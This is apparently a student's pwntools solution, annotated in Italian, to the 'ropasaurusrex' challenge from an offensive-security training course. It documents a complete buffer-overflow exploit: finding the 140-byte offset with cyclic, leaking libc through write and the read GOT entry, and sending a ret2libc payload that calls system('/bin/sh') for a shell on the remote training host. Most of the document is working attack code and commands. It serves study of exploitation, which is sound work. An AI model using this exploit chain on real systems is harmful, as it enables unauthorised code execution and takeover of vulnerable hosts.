'''
Con ldd ./ropasaurusrex vedo la libreria caricata sul file. Noi poi la vogliamo cambiare con quella dataci dalla challenge.
Per fare ciò uso il comando: patchelf --set-interpreter ./ld-2.35.so --replace-needed libc.so.6 ./libc-2.35.so ./ropasaurusrex
(questo comando è a slide 34 del vecchio pdf).
Ora se faccio ldd ./ropasaurusrex vedo che la libreria e il loader sono stati cambiati come volevo.
Prima di runnarlo ricordiamoci di fare: chmod +x la-2.35.so sennò non va.
Il programma è a 32 bit.
C'è una read di 256 bytes e un buffer di 136.
Per prima cosa devo leakare libc.
Per vedere gli indirizzi a 32 bit faccio x /40wx $esp.
Per trovare l'indirizzo di leabc uso il comando sopra e cerco gli indirizzi dopo il buffer e controllo che siano di libc con vmmap.
Ho bisogno di un loop quindi lo creo.
cyclic -n 4 300 da terminale è utile per creare ad esempio 300 bytes che cambiano pattern ogni 4 bytes: questo mi è utile per trovare l'offset invece 
di mettere delle A con le quali non capisco dove mi trovo. 
Per usarlo devo incollare l'output di questo comando nella send del programma, poi vedo dove crasha in gdb, ad esempio in 0x6261616b (dirà Invalid address 
0x6261616b) e dunque col comando cyclic -n 4 -1 0x6261616b lui mi conta i bytes che ci sono prima di arrivare al pattern che crasha (in questo caso 140).
Così adesso dopo aver messo nel payload 140 A allora sono nel controllo dell'instruction pointer (EIP).
Poi usiamo la write del programma e il suo return address sarà il main.
'''
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

# b *0x0804841b è l'indirizzo di leave 
# b * 0x08048416 è l'indirizzo di read
if REMOTE not in args:
    r = process("./ropasaurusrex")
    gdb.attach(r, """
    #b *0x0804841b
    b * 0x08048416
    c
    """)
else:
    r = remote("bin.training.offdef.it", 2014)

main = 0x0804841d # address della prima istruzione (PUSH) del main
write = 0x0804830c
read_got = 0x0804961c # è l'address della read nella GOT, quindi mi fa ottenere un address della libc da leakare (lo trovo facendo .got.plt e poi scorro fino a read)

# usiamo la write del programma e il suo return address sarà il main poi abbiamo i 3 parametri della write
payload = b"A" * 140 + p32(write) + p32(main) + p32(1) + p32(read_got) + p32(4)

# Con questa send poi avremo la libc che leggiamo nella prossima istruzione (e poi stampiamo dopo)
r.send(payload)
leak_read = r.recv(4)
read_libc = u32(leak_read)
print("[!] read_libc %#x" % read_libc)
# Ha fatto la differenza tra il primo valore della libc, anche detto libc base (0xf7c00000) e l'indirizzo leakato in locale di cui parlavo a riga 11 ed 
#  ha ottenuto 0x10a0c0 che è l'offset (è lo stesso calcolo che facevamo nelle altre challenge in mitigations).
libc_base = read_libc - 0x10a0c0
print("[!] read_libc %#x" % libc_base)

# /home/jinblack/•gem/ruby/2.7.0/bin/one_gadget /libc-2.35.50.so con questo trova il magic gadget (ne prova alcuni e vede se funzionano): i magic gadget 
# sono gli indirizzi accanto a exec prima di constraints.
# Ma non funzionano allora pensa di usare system che è dentro a libc (visto che siamo dentro a libc) e dentro a libc c'è anche /bin/sh.
# Quindi dentro a libc abbiamo sia un address di system che la stringa /bin/sh.
magic = libc_base + 0x172822

# objdump -d libc-2.35.so | grep system per trovare l'indirizzo di libc system
system = libc_base + 0x0048150
# per trovare 0x1bd0f5 lui fa ghex libc-2.35.50 e poi cerca /bin/sh ed evidenziandolo sotto gli viene scritto offset: 0x1bd0f5
binsh = libc_base + 0x1bd0f5

# 0 è il return address di system
payload = b"A" * 140 + p32(system) + p32(0) + p32(binsh)
r.send(payload)

r.interactive()

'''
Un altro modo (migliore) per trovare system e binsh (e anche read) era usare queste istruzioni:
libc = ELF("./libc-2.35.so")
hex(libc.symbols["system"]) --> questo darà 0x48150
hex(libc.symbols["read"]) --> questo darà 0x10a0c0
Ma ancora meglio:
libc.address = 0xf7c00000
hex(libc.symbols["system"]) --> questo darà 0xf7c48150
hex(libc.symbols["read"]) --> questo darà 0xf7d0a0c0
hex(next(libc.search(b"/bin/sh\×00"))) --> questo darà 0xf7dbd0f5

Quindi il codice fino a riga 51 sarebbe stato uguale, poi:
libc.address = libc_base
system = libc.symbols["system"]
binsh = next(libc.search(b"/bin/sh\×00"))

payload = b"A" * 140 + p32(system) + p32(0) + p32(binsh)
r.send(payload)

r.interactive()
'''
